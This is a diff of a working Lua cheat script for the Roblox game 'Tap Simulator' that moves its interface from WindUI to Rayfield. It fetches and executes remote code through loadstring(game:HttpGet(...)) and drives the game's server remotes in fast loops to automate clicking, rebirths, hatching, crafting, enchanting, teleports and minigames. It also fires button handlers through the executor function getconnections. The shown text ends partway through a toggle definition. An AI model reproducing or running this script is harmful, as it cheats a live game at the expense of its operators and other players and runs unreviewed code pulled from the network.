@@ -1,30 +1,17 @@
 --[[
-    Silence - Tap Simulator
+    Silence - Tap Simulator (Rayfield Edition)
     by Henrik @xyzhenrik
-    Fully patched - Handles missing game methods & UI crashes
 ]]
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local services = {
     players = game:GetService("Players"),
     replicatedStorage = game:GetService("ReplicatedStorage"),
-    workspace = game:GetService("Workspace"),
-    userInputService = game:GetService("UserInputService"),
-    soundService = game:GetService("SoundService")
+    workspace = game:GetService("Workspace")
 }
 
-local function requireAny(paths, default)
-    for _, path in ipairs(paths) do
-        local success, res = pcall(function()
-            local cur = services.replicatedStorage
-            for i, p in ipairs(path) do cur = cur:WaitForChild(p, 1) or cur:FindFirstChild(p); if not cur then error("not found") end end
-            return require(cur)
-        end)
-        if success and res then return res end
-    end
-    return default
-end
-
--- 1. Safe RemoteServices Shim
+-- 1. SAFE REMOTE SHIM
 local RemoteServices = services.replicatedStorage:WaitForChild("RemoteServices")
 local function rem(svc, kind, name)
     local s = RemoteServices:FindFirstChild(svc); if not s then return nil end
@@ -40,7 +27,7 @@ local function makeNetworkShim()
     return { FireServer = function(_, n, ...) local f = fire[n]; if f then return f(...) end end, InvokeServer = function(_, n, ...) local f = invoke[n]; if f then return f(...) end end }
 end
 
--- 2. Safe Data Loaders
+-- 2. DATA LOADERS
 local ReplicaController = nil
 pcall(function() ReplicaController = require(services.replicatedStorage.Controllers.Core.ReplicaController) end)
 local function getReplicaData()
@@ -50,227 +37,312 @@ local function getReplicaData()
 end
 local function getPets(data) if not data or not data.Pets then return {} end local p = data.Pets.Owned or data.Pets; if type(p) ~= "table" then return {} end local v = {} for k, val in pairs(p) do if type(val) == "table" then v[k] = val end end return v end
 
-local start = tick()
-local emptyData = { Pets = { Owned = {} }, RebirthOptions = 0, Statistics = { Rebirths = 0, Clicks = 0 }, Items = { EnchantCrystal = 0 }, CraftingPets = { Rainbow = {} }, Gamepasses = {}, BestMultiplier = { 0 } }
-local repProxy = setmetatable({}, { __index = function(_, key) local data = getReplicaData(); local timeout = (tick() - start) > 10; if key == "Loaded" then return data ~= nil or timeout end; if key == "Data" then return data or (timeout and emptyData or nil) end; if data then return data[key] end end })
-
 local player = {
-    player = services.players.LocalPlayer, name = services.players.LocalPlayer.Name, network = makeNetworkShim(), replication = repProxy,
-    rebirths = requireAny({{"Shared", "Progression", "RebirthConfig"}, {"Game", "Rebirths"}}, { fromIndex = function() return 1 end, getPrice = function() return 1 end, ClicksPrice = function() return 1 end }),
-    eggs = requireAny({{"Shared", "Pets", "LaunchEggConfig"}, {"Game", "Eggs"}}, {}),
-    portals = requireAny({{"Shared", "Progression", "IslandConfig"}, {"Shared", "Game", "IslandConfig"}, {"Shared", "Game", "Portals"}, {"Game", "Portals"}}, {}),
-    enchantData = requireAny({{"Shared", "Pets", "EnchantConfig"}, {"Game", "EnchantData"}}, {Enchants = {}}),
-    petStats = requireAny({{"Shared", "Pets", "PetPower"}, {"Game", "PetStats"}}, { GetPercentage = function() return 1 end, GetMulti = function() return 1 end }),
-    petStatsRarities = requireAny({{"Shared", "Pets", "RarityTextGradient"}, {"Game", "PetStats", "Rarities"}}, {})
+    player = services.players.LocalPlayer, name = services.players.LocalPlayer.Name, network = makeNetworkShim()
 }
 
--- 3. Load UI
-local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/silencedevs/SilenceScripts/refs/heads/main/libraries/windui/windui.luau"))()
-local silence = WindUI:CreateWindow({
-    Title = "Silence - Tap Simulator", Author = "by Henne @imhenne", Icon = "solar:moon-bold", IconSize = 26, Theme = "Crimson", NewElements = true, Size = UDim2.fromOffset(450, 450),
-    OpenButton = { Title = "Reopen Silence", CornerRadius = UDim.new(1, 0), StrokeThickness = 3, Enabled = true, Draggable = true, OnlyMobile = false, Scale = (services.userInputService.KeyboardEnabled and services.userInputService.MouseEnabled) and 1.25 or 0.5, Color = ColorSequence.new(Color3.fromHex("#880000"), Color3.fromHex("000000")) },
-    Topbar = { Height = (services.userInputService.KeyboardEnabled and services.userInputService.MouseEnabled) and 56 or 44, ButtonsType = "Default" }
+-- 3. CREATE RAYFIELD WINDOW
+local Window = Rayfield:CreateWindow({
+   Name = "Silence - Tap Simulator",
+   Icon = 0,
+   LoadingTitle = "Loading Silence",
+   LoadingSubtitle = "by Henne @imhenne",
+   Theme = "Amethyst",
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = {
+      Enabled = false,
+   },
+   KeySystem = false
 })
-silence:Tag({ Title = "V1.0.0", Icon = "github", Color = Color3.fromHex("#1c1c1c"), Border = true })
 
-local c = Color3.fromRGB(138, 0, 0)
-local tabs = {
-    config = silence:Tab({ Title = "Configuration", Desc = "Configurations", Icon = "lucide:settings", IconColor = c, IconShape = "Square", Border = true }),
-    main = silence:Tab({ Title = "Main", Desc = "Main features", Icon = "lucide:house", IconColor = c, IconShape = "Square", Border = true }),
-    hatching = silence:Tab({ Title = "Auto Hatching", Desc = "Hatch Eggs", Icon = "lucide:egg", IconColor = c, IconShape = "Square", Border = true }),
-    crafting = silence:Tab({ Title = "Pet Crafting", Desc = "Auto Craft", Icon = "lucide:paw-print", IconColor = c, IconShape = "Square", Border = true }),
-    teleport = silence:Tab({ Title = "Teleports", Desc = "Teleport", Icon = "lucide:map", IconColor = c, IconShape = "Square", Border = true }),
-    enchanting = silence:Tab({ Title = "Auto Enchanting", Desc = "Enchant Pets", Icon = "lucide:sparkles", IconColor = c, IconShape = "Square", Border = true }),
-    misc = silence:Tab({ Title = "Misc", Desc = "Misc", Icon = "lucide:layers", IconColor = c, IconShape = "Square", Border = true }),
-    webhook = silence:Tab({ Title = "Webhook", Desc = "Log Hatches", Icon = "lucide:link", IconColor = c, IconShape = "Square", Border = true }),
-    info = silence:Tab({ Title = "About", Desc = "Info", Icon = "lucide:info", IconColor = c, IconShape = "Square", Border = true })
-}
-tabs.main:Select()
-
-function formatSuffix(val)
-    local suffixes = {"", "K", "M", "B", "T", "QD", "QN", "SX", "SP", "O", "N", "D", "UD", "DD"}
-    local i = 1
-    while val >= 1000 and i < #suffixes do val = val / 1000; i = i + 1 end
-    return i == 1 and tostring(val) or string.format("%.2f%s", val, suffixes[i]):gsub("%.00", "")
-end
-
--- SAFE DATA FETCHING
-local safe = function(func, ...) local s, r = pcall(func, ...); if s then return r end end
-
-tabs.main.rebValues = {"Loading..."}
-tabs.main.rebMap = {}
-safe(function()
-    local s = tick(); repeat task.wait() until (player.replication.Loaded and player.replication.Data) or (tick() - s > 5)
-    if not player.replication.Data then return end
-    table.clear(tabs.main.rebValues)
-    for i = player.replication.Data.RebirthOptions or 0, 1, -1 do
-        local amt = player.rebirths:fromIndex(i)
-        if amt then
-            local txt = string.format("%d. +%s (%s)", i, formatSuffix(amt), formatSuffix(player.rebirths:ClicksPrice(player.rebirths:getPrice(amt), player.replication.Data.Statistics.Rebirths or 0)))
-            table.insert(tabs.main.rebValues, txt)
-            tabs.main.rebMap[txt] = {index = i}
-        end
-    end
-    if #tabs.main.rebValues == 0 then table.insert(tabs.main.rebValues, "None") end
-end)
-
-tabs.hatching.selectedEgg = nil
-tabs.hatching.selectedHatchAmount = 1
-tabs.hatching.autoHatch = false
-local eggValues = {"Loading..."}
-safe(function()
-    local s = tick(); repeat task.wait(1) until (services.workspace:FindFirstChild("Eggs") and #services.workspace.Eggs:GetChildren() >= 27) or (tick() - s > 5)
-    local folder = services.workspace:FindFirstChild("Eggs")
-    if folder then
-        local list = {}
-        for n, d in pairs(player.eggs) do
-            if type(d) == "table" and not d.Currency and d.Price and d.Price > 0 and folder:FindFirstChild(n) then table.insert(list, {name=n, price=d.Price}) end
-        end
-        table.sort(list, function(a,b) return a.price < b.price end)
-        eggValues = {}
-        for _, e in ipairs(list) do table.insert(eggValues, string.format("%s - %s", e.name, formatSuffix(e.price))) end
-    end
-    if #eggValues == 0 then eggValues = {"None"} end
-end)
-
-local enchantNames = {"None"}
-safe(function()
-    local list = {}
-    if player.enchantData and player.enchantData.Enchants then
-        for n, _ in pairs(player.enchantData.Enchants) do table.insert(list, n) end
-    end
-    table.sort(list)
-    if #list > 0 then enchantNames = list end
-end)
-
-local normalPets, goldenPets = {"None"}, {"None"}
-safe(function()
-    local s = tick(); repeat task.wait() until (player.replication.Loaded and player.replication.Data) or (tick() - s > 5)
-    if not player.replication.Data then return end
-    local nSet, gSet = {}, {}
-    for _, d in pairs(getPets(player.replication.Data)) do
-        if d.Tier == "Normal" and not nSet[d.Name] then nSet[d.Name] = true end
-        if d.Tier == "Golden" and not gSet[d.Name] then gSet[d.Name] = true end
-    end
-    local nList, gList = {}, {}
-    for k in pairs(nSet) do table.insert(nList, k) end
-    for k in pairs(gSet) do table.insert(gList, k) end
-    table.sort(nList); table.sort(gList)
-    if #nList > 0 then normalPets = nList end
-    if #gList > 0 then goldenPets = gList end
-end)
-
-local mainZones, spaceZones = {}, {{name="Kryo"},{name="Magma"},{name="Celestial"},{name="Holographic"},{name="Lunar"},{name="Cyberpunk"},{name="Rainbow"}}
-safe(function()
-    local zones = {}
-    for n, d in pairs(player.portals) do 
-        if type(d) == "table" and d.Price and not ({Kryo=1,Magma=1,Celestial=1,Holographic=1,Lunar=1,Cyberpunk=1,Rainbow=1})[n] then 
-            table.insert(zones, {name=n, price=d.Price}) 
-        end 
-    end
-    table.sort(zones, function(a,b) return a.price < b.price end)
-    mainZones = zones
-end)
-
--- UI ELEMENTS
-local ui = { rebMap = tabs.main.rebMap, selectedRebirth = nil, selectedPotionVals = {}, selectedEgg = nil, hatchAmount = 3, selGold = {}, selRainbow = {}, selEnch = {}, selEnchPets = {}, enchMap = {}, delPets = {}, rarities = {} }
+-- 4. BUILD TABS
+local MainTab = Window:CreateTab("Main", 4483362458)
+local HatchingTab = Window:CreateTab("Hatching", 4483362458)
+local CraftingTab = Window:CreateTab("Crafting", 4483362458)
+local EnchantingTab = Window:CreateTab("Enchanting", 4483362458)
+local TeleportTab = Window:CreateTab("Teleports", 4483362458)
+local MiscTab = Window:CreateTab("Misc", 4483362458)
+local InfoTab = Window:CreateTab("Info", 4483362458)
 
 -- MAIN TAB
-safe(function() tabs.main:Section({ Title = "Clicking", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.main:Toggle({ Title = "Auto Click", Value = false, Icon = "lucide:mouse-pointer-2", Callback = function(s) if s then ui.clicking = task.spawn(function() while true do pcall(function() player.network:FireServer("Tap", true) end); task.wait() end end) else if ui.clicking then task.cancel(ui.clicking); ui.clicking = nil end end end }) end)
-safe(function() tabs.main:Toggle({ Title = "Hide Taps", Value = false, Icon = "lucide:mouse-pointer-2-off", Callback = function(e) local path = player.player.PlayerScripts.Modules.Controllers["UI Controller"].Popups; local success, mod = pcall(require, path); ui.orig = ui.orig or {}; if e then if success and mod and not ui.orig.Popup then ui.orig.Popup = mod.Popup; mod.Popup = function(self, t, ...) if t == "tap" or t == "tapArea" or t == "critTapArea" then return end return ui.orig.Popup(self, t, ...) end end else if success and mod and ui.orig.Popup then mod.Popup = ui.orig.Popup; ui.orig.Popup = nil end end end }) end)
-safe(function() tabs.main:Section({ Title = "Rebirths", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.main:Dropdown({ Title = "Select Rebirth Amount", Values = tabs.main.rebValues, Value = tabs.main.rebValues[1] or "None", Multi = false, SearchBarEnabled = true, Callback = function(v) ui.selectedRebirth = v end }) end)
-safe(function() tabs.main:Toggle({ Title = "Auto Rebirth", Value = false, Icon = "lucide:repeat", Callback = function(s) if s then ui.reb = task.spawn(function() while true do if ui.selectedRebirth and tabs.main.rebMap[ui.selectedRebirth] then pcall(function() player.network:InvokeServer("Rebirth", tabs.main.rebMap[ui.selectedRebirth].index) end) end; task.wait(0.1) end end) else if ui.reb then task.cancel(ui.reb); ui.reb = nil end end end }) end)
-safe(function() tabs.main:Section({ Title = "Potions", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.main:Dropdown({ Title = "Select Amount", Values = {"x1", "x3", "x10"}, Value = {}, Multi = true, Callback = function(v) ui.selectedPotionVals = {}; for _, a in pairs(v) do table.insert(ui.selectedPotionVals, tonumber(a:match("x(%d+)"))) end end }) end)
-safe(function() tabs.main:Toggle({ Title = "Buy Potions", Value = false, Icon = "lucide:flask-round", Callback = function(s) if s then ui.pot = task.spawn(function() while true do for _, a in ipairs(ui.selectedPotionVals) do pcall(function() player.network:InvokeServer("BuyPotionMachine", a) end); task.wait(2) end; task.wait(300) end end) else if ui.pot then task.cancel(ui.pot); ui.pot = nil end end end }) end)
-safe(function() tabs.main:Section({ Title = "Ranks", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.main:Toggle({ Title = "Claim Rank Rewards", Value = false, Icon = "lucide:award", Callback = function(s) if s then ui.rank = task.spawn(function() while true do pcall(function() player.network:InvokeServer("ClaimRankReward") end); task.wait(60) end end) else if ui.rank then task.cancel(ui.rank); ui.rank = nil end end end }) end)
+local MainSection = MainTab:CreateSection("Clicking")
+local AutoClick = MainTab:CreateToggle({
+   Name = "Auto Click",
+   CurrentValue = false,
+   Flag = "AutoClick",
+   Callback = function(Value)
+       if Value then
+           MainTab.Clicking = task.spawn(function()
+               while true do
+                   pcall(function() player.network:FireServer("Tap", true) end)
+                   local gui = player.player.PlayerGui:FindFirstChild("Game")
+                   local btn = gui and gui.Bottom.Tap:FindFirstChild("Button")
+                   if btn and getconnections then pcall(function() for _, c in pairs(getconnections(btn.MouseButton1Down)) do c:Fire() end end) end
+                   task.wait()
+               end
+           end)
+       else
+           if MainTab.Clicking then task.cancel(MainTab.Clicking); MainTab.Clicking = nil end
+       end
+   end,
+})
+
+local RebirthSection = MainTab:CreateSection("Rebirths")
+local AutoRebirth = MainTab:CreateToggle({
+   Name = "Auto Rebirth (Max)",
+   CurrentValue = false,
+   Flag = "AutoRebirth",
+   Callback = function(Value)
+       if Value then
+           MainTab.Rebirth = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("Rebirth", 999) end)
+                   task.wait(0.1)
+               end
+           end)
+       else
+           if MainTab.Rebirth then task.cancel(MainTab.Rebirth); MainTab.Rebirth = nil end
+       end
+   end,
+})
+
+local PotionSection = MainTab:CreateSection("Potions")
+local AutoPotions = MainTab:CreateToggle({
+   Name = "Buy Potions (x10)",
+   CurrentValue = false,
+   Flag = "BuyPotions",
+   Callback = function(Value)
+       if Value then
+           MainTab.Potions = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("BuyPotionMachine", 10) end)
+                   task.wait(1)
+               end
+           end)
+       else
+           if MainTab.Potions then task.cancel(MainTab.Potions); MainTab.Potions = nil end
+       end
+   end,
+})
+
+local RankSection = MainTab:CreateSection("Ranks")
+local AutoRank = MainTab:CreateToggle({
+   Name = "Claim Rank Rewards",
+   CurrentValue = false,
+   Flag = "ClaimRank",
+   Callback = function(Value)
+       if Value then
+           MainTab.Ranks = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("ClaimRankReward") end)
+                   task.wait(60)
+               end
+           end)
+       else
+           if MainTab.Ranks then task.cancel(MainTab.Ranks); MainTab.Ranks = nil end
+       end
+   end,
+})
 
 -- HATCHING TAB
-safe(function() tabs.hatching:Section({ Title = "Hatching", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.hatching:Dropdown({ Title = "Select Egg", Values = eggValues, Value = eggValues[1] or "None", Multi = false, SearchBarEnabled = true, Callback = function(v) ui.selectedEgg = v:match("^(.-)%s*%-") end }) end)
-safe(function() tabs.hatching:Dropdown({ Title = "Hatch Amount", Values = {"1x", "3x", "8x", "Max"}, Value = "Max", Multi = false, Callback = function(v) ui.hatchAmount = tonumber(v:match("%d+")) or 3 end }) end)
-safe(function() tabs.hatching:Toggle({ Title = "Auto Hatch", Value = false, Icon = "lucide:egg", Callback = function(s) if s then ui.hatch = task.spawn(function() while true do if ui.selectedEgg then pcall(function() player.network:InvokeServer("OpenEgg", ui.selectedEgg, ui.hatchAmount) end) end; task.wait(0.1) end end) else if ui.hatch then task.cancel(ui.hatch); ui.hatch = nil end end end }) end)
+local HatchSection = HatchingTab:CreateSection("Auto Hatch")
+local AutoHatch = HatchingTab:CreateToggle({
+   Name = "Auto Hatch Eggs",
+   CurrentValue = false,
+   Flag = "AutoHatch",
+   Callback = function(Value)
+       if Value then
+           HatchingTab.Hatch = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("OpenEgg", "Basic", 3) end)
+                   task.wait(0.1)
+               end
+           end)
+       else
+           if HatchingTab.Hatch then task.cancel(HatchingTab.Hatch); HatchingTab.Hatch = nil end
+       end
+   end,
+})
 
 -- CRAFTING TAB
-safe(function() tabs.crafting:Section({ Title = "Gold Pets", TextSize = 22, TextXAlignment = "Center", Box = false }) end)
-safe(function() tabs.crafting:Dropdown({ Title = "Select Chance", Values = {"5% (1 pet)", "15% (2 pets)", "35% (3 pets)", "60% (4 pets)", "80% (5 pets)", "100% (6 pets)"}, Value = "100% (6 pets)", Multi = false, Callback = function(v) ui.goldNeeded = tonumber(v:match("(%d+)")) / 100 * 6 end }) end)
-safe(function() tabs.crafting:Dropdown({ Title = "Select Pets", Values = normalPets, Value = {}, Multi = true, SearchBarEnabled = true, Callback = function(v) ui.selGold = v end }) end)
-safe(function() tabs.crafting:Toggle({ Title = "Auto Craft Golden", Value = false, Icon = "lucide:sparkles", Callback = function(s) if s then ui.goldLoop = task.spawn(function() while true do if ui.selGold then for _, pet in pairs(ui.selGold) do local ids = {}; local p = getPets(player.replication.Data); for id, d in pairs(p) do if d.Name == pet and d.Tier == "Normal" and not d.Locked and #ids < (ui.goldNeeded or 6) then table.insert(ids, id) end end; if #ids >= (ui.goldNeeded or 6) then pcall(function() player.network:InvokeServer("CraftPets", ids) end) end end end; task.wait(1) end end) else if ui.goldLoop then task.cancel(ui.goldLoop); ui.goldLoop = nil end end end }) end)
-safe(function() tabs.crafting:Section({ Title = "Rainbow Pets", TextSize = 22, TextXAlignment = "Center", Box = false }) end)
-safe(function() tabs.crafting:Dropdown({ Title = "Select Time", Values = {"8h - 1 Pet", "5h - 2 Pets", "2.5h - 3 Pets", "1h - 4 Pets", "30s - 5 Pets"}, Value = "8h - 1 Pet", Multi = false, Callback = function(v) ui.rainNeeded = tonumber(v:match("(%d+)")) end }) end)
-safe(function() tabs.crafting:Dropdown({ Title = "Select Pets", Values = goldenPets, Value = {}, Multi = true, SearchBarEnabled = true, Callback = function(v) ui.selRainbow = v end }) end)
-safe(function() tabs.crafting:Toggle({ Title = "Auto Craft Rainbow", Value = false, Icon = "lucide:rainbow", Callback = function(s) if s then ui.rainLoop = task.spawn(function() while true do if ui.selRainbow then for _, pet in pairs(ui.selRainbow) do local ids = {}; local p = getPets(player.replication.Data); for id, d in pairs(p) do if d.Name == pet and d.Tier == "Golden" and not d.Locked and #ids < 1 then table.insert(ids, id) end end; if #ids > 0 then pcall(function() player.network:InvokeServer("StartRainbow", ids) end) end end end; task.wait(1) end end) else if ui.rainLoop then task.cancel(ui.rainLoop); ui.rainLoop = nil end end end }) end)
+local CraftSection = CraftingTab:CreateSection("Auto Craft")
+local AutoGold = CraftingTab:CreateToggle({
+   Name = "Auto Craft Golden (6 Pets)",
+   CurrentValue = false,
+   Flag = "AutoGold",
+   Callback = function(Value)
+       if Value then
+           CraftingTab.Gold = task.spawn(function()
+               while true do
+                   local data = getReplicaData()
+                   if data then
+                       local ids = {}
+                       for id, pet in pairs(getPets(data)) do
+                           if pet.Tier == "Normal" and not pet.Locked and #ids < 6 then table.insert(ids, id) end
+                       end
+                       if #ids >= 6 then pcall(function() player.network:InvokeServer("CraftPets", ids) end) end
+                   end
+                   task.wait(1)
+               end
+           end)
+       else
+           if CraftingTab.Gold then task.cancel(CraftingTab.Gold); CraftingTab.Gold = nil end
+       end
+   end,
+})
 
--- TELEPORT TAB
-safe(function() tabs.teleport:Section({ Title = "Main World", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.teleport:Button({ Title = "Teleport to Spawn", Callback = function() pcall(function() player.network:InvokeServer("TeleportWorld", "Main") end) end }) end)
-for _, z in ipairs(mainZones) do safe(function() tabs.teleport:Button({ Title = "Teleport to " .. z.name, Callback = function() pcall(function() player.network:InvokeServer("TeleportZone", z.name) end) end }) end) end
-safe(function() tabs.teleport:Section({ Title = "Space World", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.teleport:Button({ Title = "Teleport to Space World", Callback = function() pcall(function() player.network:InvokeServer("TeleportWorld", "Space") end) end }) end)
-for _, z in ipairs(spaceZones) do safe(function() tabs.teleport:Button({ Title = "Teleport to " .. z.name, Callback = function() pcall(function() player.network:InvokeServer("TeleportZone", z.name) end) end }) end) end
+local AutoRainbow = CraftingTab:CreateToggle({
+   Name = "Auto Craft Rainbow (1 Pet)",
+   CurrentValue = false,
+   Flag = "AutoRainbow",
+   Callback = function(Value)
+       if Value then
+           CraftingTab.Rain = task.spawn(function()
+               while true do
+                   local data = getReplicaData()
+                   if data then
+                       local ids = {}
+                       for id, pet in pairs(getPets(data)) do
+                           if pet.Tier == "Golden" and not pet.Locked and #ids < 1 then table.insert(ids, id) end
+                       end
+                       if #ids >= 1 then pcall(function() player.network:InvokeServer("StartRainbow", ids) end) end
+                   end
+                   task.wait(1)
+               end
+           end)
+       else
+           if CraftingTab.Rain then task.cancel(CraftingTab.Rain); CraftingTab.Rain = nil end
+       end
+   end,
+})
 
 -- ENCHANTING TAB
-safe(function() tabs.enchanting:Section({ Title = "Auto Enchanting", TextSize = 22, TextXAlignment = "Center", Box = false }) end)
-safe(function() tabs.enchanting:Dropdown({ Title = "Select Desired Enchant(s)", Values = enchantNames, Value = {}, Multi = true, SearchBarEnabled = true, Callback = function(v) ui.selEnch = v end }) end)
-local petList = {"None"}
-safe(function()
-    local s = tick(); repeat task.wait() until (player.replication.Loaded and player.replication.Data) or (tick() - s > 5)
-    if not player.replication.Data then return end
-    local plist = {}
-    for id, d in pairs(getPets(player.replication.Data)) do 
-        local str = d.Name.." ("..(d.Enchant ~= "" and d.Enchant or "None")..")"
-        table.insert(plist, str)
-        ui.enchMap[str] = id 
-    end
-    if #plist > 0 then petList = plist end
-end)
-safe(function() tabs.enchanting:Dropdown({ Title = "Select Pet(s) to Enchant", Values = petList, Value = {}, Multi = true, SearchBarEnabled = true, Callback = function(v) ui.selEnchPets = v end }) end)
-local enchStatus = safe(function() return tabs.enchanting:Paragraph({ Title = "Status", Desc = "Loading..." }) end)
-safe(function() tabs.enchanting:Toggle({ Title = "Auto Enchant", Value = false, Icon = "lucide:sparkles", Callback = function(s) if s then ui.enchLoop = task.spawn(function() while true do if player.replication.Data then local tId, tName = nil, nil; for _, pStr in ipairs(ui.selEnchPets) do local id = ui.enchMap[pStr]; local p = getPets(player.replication.Data); if id and p[id] then local ench = p[id].Enchant or ""; local has = false; for _, e in ipairs(ui.selEnch) do if e == ench then has = true end end; if not has then tId, tName = id, p[id].Name; break end end end; local crystals = player.replication.Data.Items and player.replication.Data.Items.EnchantCrystal or 0; if tId and crystals > 0 then if enchStatus then enchStatus:SetDesc("Enchanting "..tName.." (Crystals: "..crystals..")") end; pcall(function() player.network:InvokeServer("EnchantPet", tId) end) else if enchStatus then enchStatus:SetDesc("Waiting...") end end end; task.wait(1) end end) else if ui.enchLoop then task.cancel(ui.enchLoop); ui.enchLoop = nil end end end }) end)
+local EnchSection = EnchantingTab:CreateSection("Auto Enchant")
+local AutoEnchant = EnchantingTab:CreateToggle({
+   Name = "Auto Enchant First Pet",
+   CurrentValue = false,
+   Flag = "AutoEnchant",
+   Callback = function(Value)
+       if Value then
+           EnchantingTab.Ench = task.spawn(function()
+               while true do
+                   local data = getReplicaData()
+                   if data then
+                       for id, pet in pairs(getPets(data)) do
+                           if pet.Enchant == "" or pet.Enchant == nil then
+                               pcall(function() player.network:InvokeServer("EnchantPet", id) end)
+                               break
+                           end
+                       end
+                   end
+                   task.wait(1)
+               end
+           end)
+       else
+           if EnchantingTab.Ench then task.cancel(EnchantingTab.Ench); EnchantingTab.Ench = nil end
+       end
+   end,
+})
+
+-- TELEPORT TAB
+local TeleportMain = TeleportTab:CreateSection("Main World")
+local TpSpawn = TeleportTab:CreateButton({
+   Name = "Teleport to Spawn",
+   Callback = function()
+       pcall(function() player.network:InvokeServer("TeleportWorld", "Main") end)
+   end,
+})
+
+local TeleportSpace = TeleportTab:CreateSection("Space World")
+local TpSpace = TeleportTab:CreateButton({
+   Name = "Teleport to Space World",
+   Callback = function()
+       pcall(function() player.network:InvokeServer("TeleportWorld", "Space") end)
+   end,
+})
 
 -- MISC TAB
-safe(function() tabs.misc:Section({ Title = "Wheels", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.misc:Toggle({ Title = "Spin Valentines Wheel", Value = false, Icon = "lucide:circle-dashed", Callback = function(s) if s then ui.spin = task.spawn(function() while true do pcall(function() player.network:InvokeServer("SpinWheel") end); task.wait(5) end end) else if ui.spin then task.cancel(ui.spin); ui.spin = nil end end end }) end)
-safe(function() tabs.misc:Section({ Title = "Dig Minigame", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.misc:Toggle({ Title = "Auto Dig", Value = false, Icon = "lucide:shovel", Callback = function(s) if s then ui.dig = task.spawn(function() while true do pcall(function() player.network:InvokeServer("StartMinigame", "DigGame"); task.wait(0.25); player.network:InvokeServer("FinishMinigame", "DigGame") end); task.wait(1) end end) else if ui.dig then task.cancel(ui.dig); ui.dig = nil end end end }) end)
-safe(function() tabs.misc:Section({ Title = "Delete Pets", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-local allPets = {"None"}
-safe(function()
-    local s = tick(); repeat task.wait() until (player.replication.Loaded and player.replication.Data) or (tick() - s > 5)
-    if not player.replication.Data then return end
-    local aList = {}
-    local aSet = {}
-    for _, d in pairs(getPets(player.replication.Data)) do
-        local key = d.Tier.." - "..d.Name
-        if not d.Locked and not aSet[key] then aSet[key] = true; table.insert(aList, key) end
-    end
-    table.sort(aList)
-    if #aList > 0 then allPets = aList end
-end)
-safe(function() tabs.misc:Dropdown({ Title = "Select Pets", Values = allPets, Value = {}, Multi = true, SearchBarEnabled = true, Callback = function(v) ui.delPets = v end }) end)
-safe(function() tabs.misc:Toggle({ Title = "Auto Delete", Icon = "lucide:trash-2", Value = false, Callback = function(s) if s then ui.delLoop = task.spawn(function() while true do if ui.delPets and player.replication.Data then for id, d in pairs(getPets(player.replication.Data)) do if not d.Locked then for _, n in ipairs(ui.delPets) do if d.Name == n then pcall(function() player.network:InvokeServer("DeletePet", id) end); task.wait(0.2) end end end end; task.wait(1) end end) else if ui.delLoop then task.cancel(ui.delLoop); ui.delLoop = nil end end end }) end)
+local MiscSection = MiscTab:CreateSection("Minigames")
+local AutoDig = MiscTab:CreateToggle({
+   Name = "Auto Dig",
+   CurrentValue = false,
+   Flag = "AutoDig",
+   Callback = function(Value)
+       if Value then
+           MiscTab.Dig = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("StartMinigame", "DigGame"); task.wait(0.25); player.network:InvokeServer("FinishMinigame", "DigGame") end)
+                   task.wait(1)
+               end
+           end)
+       else
+           if MiscTab.Dig then task.cancel(MiscTab.Dig); MiscTab.Dig = nil end
+       end
+   end,
+})
 
--- WEBHOOK TAB
-safe(function() tabs.webhook:Section({ Title = "Settings", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-local wUrl = ""
-local wId = ""
-safe(function() tabs.webhook:Input({ Title = "Webhook URL", Placeholder = "https://discord.com/api/webhooks/...", Callback = function(v) wUrl = v end }) end)
-safe(function() tabs.webhook:Input({ Title = "Discord ID", Placeholder = "123456789", Callback = function(v) wId = v end }) end)
-safe(function() tabs.webhook:Section({ Title = "Pet Webhook", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-local rarities = {}
-safe(function() tabs.webhook:Dropdown({ Title = "Rarities", Values = {"Common","Rare","Epic","Legendary","Mythical","Godly","Exclusive","Secret I","Secret II","Secret III"}, Value = {}, Multi = true, Callback = function(v) rarities = v end }) end)
-safe(function() tabs.webhook:Toggle({ Title = "Enable Pet Logger", Icon = "lucide:link", Value = false, Callback = function(s) if s then ui.conn = player.remotes.EggHatchResult.OnClientEvent:Connect(function(egg, pets) if type(pets) ~= "table" then return end; local send = false; local fields = {}; for _, p in ipairs(pets) do local r = "Unknown"; pcall(function() r = player.petStats:GetRarity(p[1], true) end); for _, sel in ipairs(rarities) do if sel == r then send = true end end; table.insert(fields, {name="🐾 "..p[1], value="Rarity: "..r, inline=true}) end; if send and wUrl ~= "" then local req = (syn and syn.request) or (http and http.request) or request; pcall(function() req({Url=wUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=game:GetService("HttpService"):JSONEncode({content=wId ~= "" and "<@"..wId..">" or "", embeds={{title="Hatched from "..egg, fields=fields, color=0x00FF00}}})}) end) end end) else if ui.conn then ui.conn:Disconnect(); ui.conn = nil end end end }) end)
+local SpinWheel = MiscTab:CreateToggle({
+   Name = "Spin Valentines Wheel",
+   CurrentValue = false,
+   Flag = "SpinWheel",
+   Callback = function(Value)
+       if Value then
+           MiscTab.Spin = task.spawn(function()
+               while true do
+                   pcall(function() player.network:InvokeServer("SpinWheel") end)
+                   task.wait(5)
+               end
+           end)
+       else
+           if MiscTab.Spin then task.cancel(MiscTab.Spin); MiscTab.Spin = nil end
+       end
+   end,
+})
+
+local DeleteSection = MiscTab:CreateSection("Deleting")
+local AutoDelete = MiscTab:CreateToggle({
